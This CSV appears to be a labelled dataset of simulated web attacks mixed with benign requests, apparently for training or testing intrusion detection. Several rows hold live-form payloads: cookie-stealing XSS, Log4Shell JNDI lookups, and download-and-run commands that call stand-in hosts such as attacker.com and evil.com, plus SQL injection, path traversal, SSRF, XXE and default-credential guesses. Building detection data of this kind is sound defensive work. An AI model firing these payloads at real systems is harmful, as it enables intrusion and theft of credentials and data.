timestamp,attack_type,cve,cvss_score,severity,payload_snippet,label,status_code
2026-05-21T12:15:04.883748,dos,N/A,0,HIGH,large_payload,1,201
2026-05-21T12:15:04.947571,dos,N/A,0,HIGH,large_payload,1,201
2026-05-21T12:15:05.041193,dos,N/A,0,HIGH,large_payload,1,201
2026-05-21T12:15:07.046116,dos,N/A,0,HIGH,large_payload,1,201
2026-05-21T12:15:07.121058,dos,N/A,0,HIGH,large_payload,1,201
2026-05-21T12:15:07.215162,dos,N/A,0,HIGH,large_payload,1,201
2026-05-21T12:15:07.311747,dos,N/A,0,HIGH,large_payload,1,201
2026-05-21T12:15:09.223527,dos,N/A,0,HIGH,large_payload,1,201
2026-05-21T12:15:09.280541,dos,N/A,0,HIGH,large_payload,1,201
2026-05-21T12:15:09.404974,dos,N/A,0,HIGH,large_payload,1,201
2026-05-21T12:15:09.483073,dos,N/A,0,HIGH,large_payload,1,201
2026-05-21T12:15:11.496443,dos,N/A,0,HIGH,large_payload,1,201
2026-05-21T12:15:11.557880,dos,N/A,0,HIGH,large_payload,1,201
2026-05-21T12:15:11.619824,dos,N/A,0,HIGH,large_payload,1,201
2026-05-21T12:15:11.682453,dos,N/A,0,HIGH,large_payload,1,201
2026-05-21T12:15:13.723647,dos,N/A,0,HIGH,large_payload,1,201
2026-05-21T12:15:13.819503,dos,N/A,0,HIGH,large_payload,1,201
2026-05-21T12:15:13.879877,dos,N/A,0,HIGH,large_payload,1,201
2026-05-21T12:15:13.940440,dos,N/A,0,HIGH,large_payload,1,201
2026-05-21T12:15:15.882312,dos,N/A,0,HIGH,large_payload,1,201
2026-05-21T12:15:15.957293,dos,N/A,0,HIGH,large_payload,1,201
2026-05-21T12:15:16.036412,dos,N/A,0,HIGH,large_payload,1,201
2026-05-21T12:15:16.111528,dos,N/A,0,HIGH,large_payload,1,201
2026-05-21T12:15:18.046945,dos,N/A,0,HIGH,large_payload,1,201
2026-05-21T12:15:18.108680,dos,N/A,0,HIGH,large_payload,1,201
2026-05-21T12:15:18.168217,dos,N/A,0,HIGH,large_payload,1,201
2026-05-21T12:15:18.247242,dos,N/A,0,HIGH,large_payload,1,201
2026-05-21T12:15:20.165788,dos,N/A,0,HIGH,large_payload,1,201
2026-05-21T12:15:20.243423,dos,N/A,0,HIGH,large_payload,1,201
2026-05-21T12:15:20.306514,dos,N/A,0,HIGH,large_payload,1,201
2026-05-21T12:15:20.416265,dos,N/A,0,HIGH,large_payload,1,201
2026-05-21T12:15:22.485158,benign,N/A,0,NONE,normal_products,0,N/A
2026-05-21T12:15:25.508351,benign,N/A,0,NONE,normal_data,0,201
2026-05-21T12:15:28.443221,benign,N/A,0,NONE,normal_users,0,N/A
2026-05-21T12:15:31.244910,benign,N/A,0,NONE,normal_data,0,201
2026-05-21T12:15:33.697740,benign,N/A,0,NONE,normal_orders,0,N/A
2026-05-21T12:15:49.947163,sqli,CVE-2021-32745,8.8,HIGH,1; WAITFOR DELAY '0:0:5'--,1,N/A
2026-05-21T12:15:54.387616,sqli,CVE-2012-3153,7.5,HIGH,' OR 'x'='x,1,N/A
2026-05-21T12:15:59.217858,sqli,CVE-2012-3153,7.5,HIGH,"' UNION SELECT NULL,NULL,NULL FROM dual--",1,N/A
2026-05-21T12:16:01.656570,benign,N/A,0,NONE,normal_orders,0,N/A
2026-05-21T12:16:04.267692,benign,N/A,0,NONE,normal_data,0,201
2026-05-21T12:16:06.918786,benign,N/A,0,NONE,normal_products,0,N/A
2026-05-21T12:16:09.912412,benign,N/A,0,NONE,normal_orders,0,N/A
2026-05-21T12:16:12.756147,benign,N/A,0,NONE,normal_orders,0,N/A
2026-05-21T12:16:15.556737,benign,N/A,0,NONE,normal_products,0,N/A
2026-05-21T12:16:18.099264,benign,N/A,0,NONE,normal_data,0,201
2026-05-21T12:16:20.974014,benign,N/A,0,NONE,normal_products,0,N/A
2026-05-21T12:16:26.784638,xss,CVE-2021-26855,9.8,CRITICAL,<script>fetch('https://attacker.com/?c='+document.cookie)</script>,1,N/A
2026-05-21T12:16:31.426042,xss,CVE-2019-11358,6.1,MEDIUM,<script>Object.prototype.nodeName='SCRIPT'</script>,1,N/A
2026-05-21T12:16:33.660238,benign,N/A,0,NONE,normal_users,0,N/A
2026-05-21T12:16:36.448809,benign,N/A,0,NONE,normal_orders,0,N/A
2026-05-21T12:16:39.053838,benign,N/A,0,NONE,normal_products,0,N/A
2026-05-21T12:16:41.510451,benign,N/A,0,NONE,normal_data,0,201
2026-05-21T12:16:43.913100,benign,N/A,0,NONE,normal_products,0,N/A
2026-05-21T12:16:46.487567,benign,N/A,0,NONE,normal_data,0,201
2026-05-21T12:16:49.525439,benign,N/A,0,NONE,normal_data,0,201
2026-05-21T12:16:51.962229,benign,N/A,0,NONE,normal_orders,0,N/A
2026-05-21T12:16:58.126510,ssrf,CVE-2021-22986,9.8,CRITICAL,http://127.0.0.1:8080/manager/html,1,N/A
2026-05-21T12:17:02.618814,ssrf,CVE-2021-22986,9.8,CRITICAL,http://100.100.100.200/latest/meta-data/,1,N/A
2026-05-21T12:17:06.756694,ssrf,CVE-2021-22986,9.8,CRITICAL,http://127.0.0.1:8080/manager/html,1,N/A
2026-05-21T12:17:09.190207,benign,N/A,0,NONE,normal_products,0,N/A
2026-05-21T12:17:11.926451,benign,N/A,0,NONE,normal_products,0,N/A
2026-05-21T12:17:14.576554,benign,N/A,0,NONE,normal_orders,0,N/A
2026-05-21T12:17:17.034006,benign,N/A,0,NONE,normal_users,0,N/A
2026-05-21T12:17:19.596493,benign,N/A,0,NONE,normal_orders,0,N/A
2026-05-21T12:17:22.617167,benign,N/A,0,NONE,normal_data,0,201
2026-05-21T12:17:28.671878,log4shell,CVE-2021-44228,10.0,CRITICAL,${jndi:dns://attacker.com},1,N/A
2026-05-21T12:17:33.312687,log4shell,CVE-2021-44228,10.0,CRITICAL,${jndi:rmi://attacker.com/payload},1,N/A
2026-05-21T12:17:37.822888,log4shell,CVE-2021-44228,10.0,CRITICAL,${jndi:ldaps://evil.com:1389/Exploit},1,N/A
2026-05-21T12:17:40.539384,log4shell,CVE-2021-45046,9.0,CRITICAL,${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://attacker.com/poc},1,N/A
2026-05-21T12:17:42.880844,benign,N/A,0,NONE,normal_orders,0,N/A
2026-05-21T12:17:45.218323,benign,N/A,0,NONE,normal_orders,0,N/A
2026-05-21T12:17:47.515672,benign,N/A,0,NONE,normal_orders,0,N/A
2026-05-21T12:17:49.793385,benign,N/A,0,NONE,normal_users,0,N/A
2026-05-21T12:17:52.990012,benign,N/A,0,NONE,normal_data,0,201
2026-05-21T12:17:55.781442,benign,N/A,0,NONE,normal_products,0,N/A
2026-05-21T12:17:58.360479,benign,N/A,0,NONE,normal_products,0,N/A
2026-05-21T12:18:00.804685,benign,N/A,0,NONE,normal_products,0,N/A
2026-05-21T12:18:19.103144,brute_force,CVE-2019-1040,5.9,HIGH,support:123456,1,N/A
2026-05-21T12:18:21.680040,brute_force,CVE-2019-1040,5.9,HIGH,support:123456,1,N/A
2026-05-21T12:18:24.346937,brute_force,CVE-2019-1040,5.9,HIGH,admin:12345678,1,N/A
2026-05-21T12:18:26.976324,brute_force,CVE-2019-1040,5.9,HIGH,administrator:admin123,1,N/A
2026-05-21T12:18:32.554366,brute_force,CVE-2019-1040,5.9,HIGH,root:qwerty,1,N/A
2026-05-21T12:18:34.835844,brute_force,CVE-2019-1040,5.9,HIGH,support:letmein,1,N/A
2026-05-21T12:18:37.188218,benign,N/A,0,NONE,normal_products,0,N/A
2026-05-21T12:18:39.930385,benign,N/A,0,NONE,normal_products,0,N/A
2026-05-21T12:18:42.578903,benign,N/A,0,NONE,normal_orders,0,N/A
2026-05-21T12:18:46.147722,path_traversal,CVE-2021-41773,9.8,CRITICAL,/..%2F..%2F..%2Fetc%2Fpasswd,1,N/A
2026-05-21T12:18:46.506072,path_traversal,CVE-2019-18935,9.8,CRITICAL,..%2f..%2f..%2fwindows%2fsystem32%2fdrivers%2fetc%2fhosts,1,N/A
2026-05-21T12:18:48.878517,path_traversal,CVE-2021-41773,9.8,CRITICAL,/static/../../../etc/hosts,1,N/A
2026-05-21T12:18:51.114008,benign,N/A,0,NONE,normal_products,0,N/A
2026-05-21T12:18:53.884530,benign,N/A,0,NONE,normal_data,0,201
2026-05-21T12:18:56.786858,benign,N/A,0,NONE,normal_users,0,N/A
2026-05-21T12:19:00.715001,xxe,CVE-2021-27065,7.8,HIGH,<?xml version='1.0' encoding='UTF-8'?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM 'http://attacker.com/evil.dtd,1,201
2026-05-21T12:19:03.033785,benign,N/A,0,NONE,normal_products,0,N/A
2026-05-21T12:19:05.670804,benign,N/A,0,NONE,normal_users,0,N/A
2026-05-21T12:19:08.415733,benign,N/A,0,NONE,normal_products,0,N/A
2026-05-21T12:19:11.431377,benign,N/A,0,NONE,normal_orders,0,N/A
2026-05-21T12:19:15.527046,csrf,OWASP-A01,6.5,MEDIUM,"{""name"": ""Victim"", ""email"": ""victim713@mail.com"", ""amount"": 3924, ""action"": ""tra",1,201
2026-05-21T12:19:17.971012,csrf,OWASP-A01,6.5,MEDIUM,"{""name"": ""Victim"", ""email"": ""victim381@mail.com"", ""amount"": 4838, ""action"": ""tra",1,201
2026-05-21T12:19:20.601723,benign,N/A,0,NONE,normal_users,0,N/A
2026-05-21T12:19:23.279889,benign,N/A,0,NONE,normal_products,0,N/A
2026-05-21T12:19:25.840201,benign,N/A,0,NONE,normal_data,0,201
2026-05-21T12:19:28.178751,benign,N/A,0,NONE,normal_data,0,201
2026-05-21T12:19:31.215122,benign,N/A,0,NONE,normal_data,0,201
2026-05-21T12:19:33.918216,benign,N/A,0,NONE,normal_products,0,N/A
2026-05-21T12:19:36.753125,benign,N/A,0,NONE,normal_data,0,201
2026-05-21T12:19:39.174381,benign,N/A,0,NONE,normal_data,0,201
2026-05-21T12:19:45.371497,sqli,CVE-2021-32745,8.8,HIGH,1; WAITFOR DELAY '0:0:5'--,1,N/A
2026-05-21T12:19:49.460078,sqli,CVE-2021-32745,8.8,HIGH,'; SELECT pg_sleep(5)--,1,N/A
2026-05-21T12:19:53.256165,sqli,CVE-2019-9193,9.8,CRITICAL,"' UNION SELECT username,password,3 FROM pg_shadow--",1,N/A
2026-05-21T12:19:57.258843,sqli,CVE-2021-32745,8.8,HIGH,'; SELECT pg_sleep(5)--,1,N/A
2026-05-21T12:19:59.457816,benign,N/A,0,NONE,normal_products,0,N/A
2026-05-21T12:20:02.243384,benign,N/A,0,NONE,normal_users,0,N/A
2026-05-21T12:20:04.925416,benign,N/A,0,NONE,normal_orders,0,N/A
2026-05-21T12:20:07.817837,benign,N/A,0,NONE,normal_products,0,N/A
2026-05-21T12:20:10.152079,benign,N/A,0,NONE,normal_data,0,201
2026-05-21T12:20:13.131375,benign,N/A,0,NONE,normal_data,0,201
2026-05-21T12:20:15.914959,benign,N/A,0,NONE,normal_orders,0,N/A
2026-05-21T12:20:33.598814,recon,N/A,0,LOW,/xmlrpc.php,1,N/A
2026-05-21T12:20:37.513616,recon,N/A,0,LOW,/wp-admin,1,N/A
2026-05-21T12:20:39.792188,recon,N/A,0,LOW,/admin,1,N/A
2026-05-21T12:20:42.060167,recon,N/A,0,LOW,/.aws/credentials,1,N/A
2026-05-21T12:20:45.757206,recon,N/A,0,LOW,/server-status,1,N/A
2026-05-21T12:20:47.998249,recon,N/A,0,LOW,/server-status,1,N/A
2026-05-21T12:20:51.975975,recon,N/A,0,LOW,/phpmyadmin,1,N/A
2026-05-21T12:20:54.311515,benign,N/A,0,NONE,normal_data,0,201
2026-05-21T12:20:57.046264,benign,N/A,0,NONE,normal_products,0,N/A
2026-05-21T12:20:59.680712,benign,N/A,0,NONE,normal_users,0,N/A
2026-05-21T12:21:02.136565,benign,N/A,0,NONE,normal_users,0,N/A
2026-05-21T12:21:04.945362,benign,N/A,0,NONE,normal_products,0,N/A
2026-05-21T12:21:07.792421,benign,N/A,0,NONE,normal_products,0,N/A
2026-05-21T12:21:10.393525,benign,N/A,0,NONE,normal_data,0,201
2026-05-21T12:21:13.687632,cmd_injection,CVE-2020-14882,9.8,CRITICAL,/console/css/%252e%252e%252fconsole.portal?_nfpb=true&_pageLabel=&handle=com.bea.handles.MBeanHandle,1,201
2026-05-21T12:21:15.992117,cmd_injection,CVE-2020-14882,9.8,CRITICAL,& powershell -c IEX(New-Object Net.WebClient).DownloadString('http://evil.com/ps.ps1'),1,201
2026-05-21T12:21:21.584959,cmd_injection,CVE-2020-14882,9.8,CRITICAL,; curl http://attacker.com/shell.sh | bash,1,N/A
2026-05-21T12:21:27.442339,cmd_injection,CVE-2021-22205,10.0,CRITICAL,; cat /etc/passwd,1,N/A
2026-05-21T12:21:29.780814,benign,N/A,0,NONE,normal_data,0,201
2026-05-21T12:21:32.662425,benign,N/A,0,NONE,normal_data,0,201
2026-05-21T12:21:35.685324,benign,N/A,0,NONE,normal_users,0,N/A
2026-05-21T12:21:37.976705,benign,N/A,0,NONE,normal_products,0,N/A
2026-05-21T12:21:40.367203,benign,N/A,0,NONE,normal_orders,0,N/A
2026-05-21T12:21:43.060340,benign,N/A,0,NONE,normal_products,0,N/A
2026-05-21T12:21:45.368733,benign,N/A,0,NONE,normal_products,0,N/A
2026-05-21T12:21:47.912799,benign,N/A,0,NONE,normal_products,0,N/A
2026-05-21T12:21:55.442046,xss,CVE-2021-26855,9.8,CRITICAL,<script>fetch('https://attacker.com/?c='+document.cookie)</script>,1,N/A
2026-05-21T12:21:59.858437,xss,CVE-2021-26855,9.8,CRITICAL,<script>fetch('https://attacker.com/?c='+document.cookie)</script>,1,N/A
2026-05-21T12:22:05.338169,xss,CVE-2019-11358,6.1,MEDIUM,<input onfocus=alert(1) autofocus>,1,N/A
2026-05-21T12:22:07.593256,benign,N/A,0,NONE,normal_products,0,N/A
2026-05-21T12:22:09.937807,benign,N/A,0,NONE,normal_users,0,N/A
2026-05-21T12:22:12.715426,benign,N/A,0,NONE,normal_data,0,201
2026-05-21T12:22:16.096636,dos,N/A,0,HIGH,large_payload,1,201
2026-05-21T12:22:16.158190,dos,N/A,0,HIGH,large_payload,1,201
2026-05-21T12:22:16.219633,dos,N/A,0,HIGH,large_payload,1,201
2026-05-21T12:22:16.280693,dos,N/A,0,HIGH,large_payload,1,201
2026-05-21T12:22:18.268993,dos,N/A,0,HIGH,large_payload,1,201
2026-05-21T12:22:18.347566,dos,N/A,0,HIGH,large_payload,1,201
2026-05-21T12:22:18.406408,dos,N/A,0,HIGH,large_payload,1,201
2026-05-21T12:22:18.468450,dos,N/A,0,HIGH,large_payload,1,201
2026-05-21T12:22:20.428742,dos,N/A,0,HIGH,large_payload,1,201
2026-05-21T12:22:20.503129,dos,N/A,0,HIGH,large_payload,1,201
2026-05-21T12:22:20.565808,dos,N/A,0,HIGH,large_payload,1,201
2026-05-21T12:22:20.626833,dos,N/A,0,HIGH,large_payload,1,201
2026-05-21T12:22:22.561288,dos,N/A,0,HIGH,large_payload,1,201
2026-05-21T12:22:22.640607,dos,N/A,0,HIGH,large_payload,1,201
2026-05-21T12:22:22.701052,dos,N/A,0,HIGH,large_payload,1,201
2026-05-21T12:22:22.796851,dos,N/A,0,HIGH,large_payload,1,201
2026-05-21T12:22:24.762643,dos,N/A,0,HIGH,large_payload,1,201
2026-05-21T12:22:24.826518,dos,N/A,0,HIGH,large_payload,1,201
2026-05-21T12:22:24.901386,dos,N/A,0,HIGH,large_payload,1,201
2026-05-21T12:22:24.961512,dos,N/A,0,HIGH,large_payload,1,201
2026-05-21T12:22:26.923737,dos,N/A,0,HIGH,large_payload,1,201
2026-05-21T12:22:26.982927,dos,N/A,0,HIGH,large_payload,1,201
2026-05-21T12:22:27.075724,dos,N/A,0,HIGH,large_payload,1,201
2026-05-21T12:22:27.151796,dos,N/A,0,HIGH,large_payload,1,201
2026-05-21T12:22:29.074794,dos,N/A,0,HIGH,large_payload,1,201
2026-05-21T12:22:29.150109,dos,N/A,0,HIGH,large_payload,1,201
2026-05-21T12:22:29.245756,dos,N/A,0,HIGH,large_payload,1,201
2026-05-21T12:22:29.320640,dos,N/A,0,HIGH,large_payload,1,201
2026-05-21T12:22:31.266609,dos,N/A,0,HIGH,large_payload,1,201
2026-05-21T12:22:31.354694,dos,N/A,0,HIGH,large_payload,1,201
2026-05-21T12:22:31.434375,dos,N/A,0,HIGH,large_payload,1,201
2026-05-21T12:22:31.494544,dos,N/A,0,HIGH,large_payload,1,201
2026-05-21T12:22:33.618477,benign,N/A,0,NONE,normal_products,0,N/A
2026-05-21T12:22:36.064759,benign,N/A,0,NONE,normal_data,0,201
2026-05-21T12:22:38.382196,benign,N/A,0,NONE,normal_products,0,N/A
2026-05-21T12:22:41.192585,benign,N/A,0,NONE,normal_products,0,N/A
